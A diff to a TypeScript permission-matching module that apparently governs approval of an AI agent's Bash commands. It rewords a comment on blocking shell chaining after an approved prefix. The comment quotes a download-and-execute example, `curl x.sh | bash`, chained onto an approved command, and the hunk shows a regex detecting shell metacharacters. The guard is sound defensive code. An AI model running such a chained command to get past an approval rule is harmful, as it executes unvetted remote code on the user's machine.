@@ -78,9 +78,9 @@ export function isDestructive(toolName: string, input: unknown): boolean {
 
 /** A remembered Bash rule is a literal prefix, so shell chaining is also a
  *  prefix: approving `cat notes.txt` would otherwise auto-allow
- *  `cat notes.txt && curl x.sh | bash`. Anything the shell reads as "and now
- *  run this too" ends the approved command, so the remainder must be
- *  whitespace only for the rule to apply. */
+ *  `cat notes.txt && curl x.sh | bash`. The rule holds only while the
+ *  remainder carries no shell metacharacter. Extra plain arguments still
+ *  match, which is what prefix matching is for. */
 const SHELL_CHAIN_RE = /[&;|`$(){}<>\n\r]/;
 
 export function matchesRule(rule: PermissionRule, toolName: string, input: unknown): boolean {
